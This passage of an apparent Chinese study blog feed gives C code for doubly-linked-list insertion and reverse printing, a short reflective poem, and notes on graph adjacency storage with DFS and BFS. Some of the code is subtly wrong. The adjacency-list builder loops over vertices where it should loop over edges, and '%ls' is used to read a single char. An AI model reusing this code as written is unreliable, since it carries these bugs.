<h3 id="5-设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。"><a href="#5-设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。" class="headerlink" title="5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。"></a>5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *p = head-&gt;rlink;</span><br><span class="line">    dnode *s;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n双链表中不存在值为 y 的结点，无法插入！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = p;</span><br><span class="line">        p-&gt;llink-&gt;rlink = s;</span><br><span class="line">        s-&gt;llink = p-&gt;llink;</span><br><span class="line">        p-&gt;llink = s;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">rlink</span>,*<span class="title">llink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">	p = head-&gt;rlink;  <span class="comment">//由于是带头结点的 所以 指向 head 的 下一个位置</span></span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;rlink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *p = head-&gt;rlink;</span><br><span class="line">    dnode *s;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n双链表中不存在值为 y 的结点，无法插入！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = p;</span><br><span class="line">        p-&gt;llink-&gt;rlink = s;</span><br><span class="line">        s-&gt;llink = p-&gt;llink;</span><br><span class="line">        p-&gt;llink = s;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt,*pt1;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行操作之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    pt1 = insert(pt,<span class="number">10</span>,<span class="number">99</span>); <span class="comment">//在 10 前面插入 99</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行操作之后：\n&quot;</span>);</span><br><span class="line">    print(pt1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/Cf2WKS5phxjXoIi.png" alt="image-20211005184052812"></p>
<h3 id="6-设计一个算法，从右向左打印一个双链表中各个结点的值。"><a href="#6-设计一个算法，从右向左打印一个双链表中各个结点的值。" class="headerlink" title="6. 设计一个算法，从右向左打印一个双链表中各个结点的值。"></a>6. 设计一个算法，从右向左打印一个双链表中各个结点的值。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从右向左打印一个双链表中各个结点的值</span></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_reverse</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;rlink)&#123;</span><br><span class="line">        print_reverse(head-&gt;rlink);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,head-&gt;rlink-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">rlink</span>,*<span class="title">llink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法  创建 带头结点的 双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s;</span><br><span class="line">	datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入双链表的内容：（以 0 结束）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink;</span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">    p = head-&gt;rlink;</span><br><span class="line">	<span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表的各个值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;rlink;</span><br><span class="line">    	&#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从右向左打印一个双链表中各个结点的值</span></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_reverse</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;rlink)&#123;</span><br><span class="line">        print_reverse(head-&gt;rlink);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,head-&gt;rlink-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行操作之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行操作之后：\n&quot;</span>);</span><br><span class="line">	print_reverse(pt);	</span><br><span class="line">    <span class="comment">//print(pt);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/iMBrSeKhj7Z819k.png" alt="image-20211005185759360"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>链式存储</tag>
      </tags>
  </entry>
  <entry>
    <title>唯愿我们</title>
    <url>/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="唯愿我们"><a href="#唯愿我们" class="headerlink" title="唯愿我们"></a>唯愿我们</h3><p>从鲜衣怒马到鬓染白发 </p>
<p>不过弹指一刹那； </p>
<p>从小桥人家到沧海无涯</p>
<p>匆匆一眼尽繁华。 </p>
<p>流年似水， 往事不可追； </p>
<p>光阴似箭， 物是人已非。 </p>
<p>让烦恼缠绕心尖， 生活一片颓然； </p>
<p>让痛苦徘徊耳边， 人生全是不满。</p>
<p>感情的遗憾， 不如放手随他。 </p>
<p>想送你回家的人， </p>
<p>东西南北都顺路； </p>
<p>想陪你吃饭的人， </p>
<p>酸甜苦辣都可口；</p>
<p>想见你一面的人，</p>
<p>隔山隔海都能来。</p>
<p>生活的刁难， 不如看淡放宽。</p>
<p>生命这一程， 交织着风霜雨雪；</p>
<p>人生这一段， 夹杂着泥泞坎坷。 </p>
<p>没有跨不过的河， </p>
<p>没有迈不过的坎。</p>
<p>内心的执迷， 不如随风飘散。</p>
<p>有一往无前， 就有知难而退。 </p>
<p>看透了， 便是过眼云烟； </p>
<p>想通了， 不过昙花一现。 </p>
<p>不念过去， 不畏将来， </p>
<p>你若不放心上， 岁月便会无恙。</p>
<p>边走边看， 是一种优雅；</p>
<p>边走边忘， 是一份豁达。 </p>
<p>敬往事一杯酒， 愿岁月不回头。 </p>
<p><strong>唯愿我们：</strong></p>
<p>  <strong>过去的， 别再遗憾；</strong><br>  <strong>未来的， 无须忧虑；</strong><br>  <strong>现在的， 加倍珍惜。</strong></p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>图</title>
    <url>/2021/11/14/%E5%9B%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、图的基本存储结构"><a href="#一、图的基本存储结构" class="headerlink" title="一、图的基本存储结构"></a>一、图的基本存储结构</h1><p>需要存储的内容：存储 顶点信息、顶点之间的关系</p>
<p><strong>三种常用的 图的 存储结构：</strong></p>
<ul>
<li>邻接矩阵</li>
<li>邻接表</li>
<li>临界多重链表</li>
</ul>
<h2 id="1-1-邻接矩阵"><a href="#1-1-邻接矩阵" class="headerlink" title="1.1 邻接矩阵"></a>1.1 邻接矩阵</h2><p><strong>存储结构：</strong></p>
<ul>
<li><p>一维数组（顺序表）——  存储 数据元素的信息</p>
</li>
<li><p>二维数组（邻接矩阵）—— 存储 数据元素之间的 关系</p>
</li>
</ul>
<p><strong>特点：</strong></p>
<ul>
<li><p>无向图的邻接矩阵 一定是对称的，可使用 上三角或者是 下三角进行压缩存储，其存储空间只需要 <code>n(n+1)/2</code></p>
</li>
<li><p>有向图的邻接矩阵 不一定是 对称的，其存储空间为 <code>n 的平方</code></p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FINITY 5000		<span class="comment">//此处使用 5000 表示无穷大</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20			<span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;<span class="comment">//顶点值类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> edgetype;	<span class="comment">//权值类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>				<span class="comment">//邻接矩阵 类型</span></span><br><span class="line">    vertextype vexs[M];  	<span class="comment">//顶点信息域（一维数组）</span></span><br><span class="line">    edgetype edges[M][M];  	<span class="comment">//邻接矩阵（二维数组）</span></span><br><span class="line">    <span class="keyword">int</span> n,e;				<span class="comment">//图中顶点总数 与 边数</span></span><br><span class="line">&#125;Mgraph;</span><br></pre></td></tr></table></figure>

<p><strong>建立网络的 邻接矩阵算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat</span><span class="params">(Mgraph *g,<span class="keyword">char</span> *s,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=1表示建立有向图，c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k,w;</span><br><span class="line">    FILE *rf;</span><br><span class="line">    rf = fopen(s,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(rf)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;vexs[i]);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g-&gt;n;j++)</span><br><span class="line">                <span class="keyword">if</span>(i == j)</span><br><span class="line">                    g-&gt;edges[i][j] = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">            g-&gt;edges[i][j] = w;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">                g-&gt;edges[j][i] = w;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(rf);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        g-&gt;n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>缺点：邻接矩阵法，占用的存单元只与图中顶点的个数有关，与边数无关，如果一个图中的边数比结点个数少得多，则该邻接矩阵中就会出现很对的空元素，从而浪费空间。</p>
<h2 id="1-2-邻接表"><a href="#1-2-邻接表" class="headerlink" title="1.2 邻接表"></a>1.2 邻接表</h2><p><strong>存储结构：</strong></p>
<ul>
<li>头结点：两个域—–数据域 <code>vertex</code> ，头指针域 <code>firstedge</code></li>
<li>表结点：两个域—–邻接点域 <code>adjvex</code>  ，链域  <code>next</code></li>
<li>如果是网络，带权值，则可在头结点中添加一个数据域来存储权值</li>
</ul>
<p>出边表（有向图的邻接表）、入边表（逆邻接表）</p>
<p><strong>如果图中含有 n 个顶点，e  条边，则它的邻接表存储结构需要 n个头结点和 2e 个边结点</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20			<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;	<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>	<span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;			<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span>	<span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span>	<span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;	<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;			</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>			<span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;			  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br></pre></td></tr></table></figure>

<p><strong>无向图邻接表建立算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);		<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;n; k++)&#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);		<span class="comment">//输入无序对</span></span><br><span class="line">			s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">			s-&gt;adjvex = j;</span><br><span class="line">			s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">			g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line">			<span class="keyword">if</span>(c == <span class="number">0</span>)&#123;			<span class="comment">//无向图</span></span><br><span class="line">				s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">				s-&gt;adjvex = i;</span><br><span class="line">				s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">				g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>		<span class="comment">//文件打开失败</span></span><br><span class="line">		g-&gt;n = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：文件输入 数据内容时，第一行的结点个数不变，为 n，但是边数得是 2e</p>
<h2 id="1-3-邻接多重表"><a href="#1-3-邻接多重表" class="headerlink" title="1.3 邻接多重表"></a>1.3 邻接多重表</h2><p>边表结点：五个域</p>
<ul>
<li><p>mark    标志域（是否被访问过）</p>
</li>
<li><p>vexi  vexj   该边两个顶点在图中的位序</p>
</li>
<li><p>linki  linkj   两个边结点的指针</p>
<p>linki  指向关联与 vexi 结点的下一条边</p>
<p>linkj  指向关联与  vexj 结点的下一条边</p>
</li>
</ul>
<p>表头结点：两个域</p>
<ul>
<li>vertex  顶点信息</li>
<li>firstedge   关联与 顶点 的 第一条边</li>
</ul>
<h1 id="二、图的遍历"><a href="#二、图的遍历" class="headerlink" title="二、图的遍历"></a>二、图的遍历</h1><h2 id="2-1-深度优先遍历"><a href="#2-1-深度优先遍历" class="headerlink" title="2.1 深度优先遍历"></a>2.1 深度优先遍历</h2><p>访问顺序域图的邻接表的存储状态有关，由于图的邻接表存储不是唯一的，则对于同一个图，其深度优先遍历的输出结果也是不同的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;visit vertex: %c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;		<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;		<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            dfs(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])		<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            dfs(g,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-广度优先遍历"><a href="#2-2-广度优先遍历" class="headerlink" title="2.2 广度优先遍历"></a>2.2 广度优先遍历</h2><p>特点：尽可能地首先对 横向结点进行访问</p>
<p>使用队列，使用邻接表存储结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];   <span class="comment">//全局标志：是否访问过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">queue</span>[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>;		 <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">queue</span>[rear++] = i;		<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = <span class="built_in">queue</span>[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                <span class="built_in">queue</span>[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span 